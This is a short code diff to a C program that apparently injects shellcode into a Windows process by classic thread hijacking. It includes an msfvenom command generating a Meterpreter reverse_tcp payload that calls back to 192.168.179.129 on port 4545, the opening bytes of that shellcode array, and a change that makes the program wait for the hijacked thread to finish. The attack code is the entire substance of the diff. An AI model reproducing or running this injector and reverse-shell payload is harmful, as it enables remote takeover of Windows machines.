@@ -51,9 +51,8 @@ BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_
 
 	return TRUE;
 }
+// msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=192.168.179.129 LPORT=4545 -f c
 
-//metasploit payload reverse tcp
-//msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=192.168.179.129 LPORT=4545 -f c
 
 unsigned char Payload[] =
 "\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52"
@@ -106,8 +105,7 @@ int main() {
 	// Resuming suspended thread, so that it runs our shellcode
 	ResumeThread(hThread);
 
-	printf("[#] Press <Enter> To Quit ... ");
-	getchar();
+	WaitForSingleObject(hThread, INFINITE);
 
 	return 0;
 }
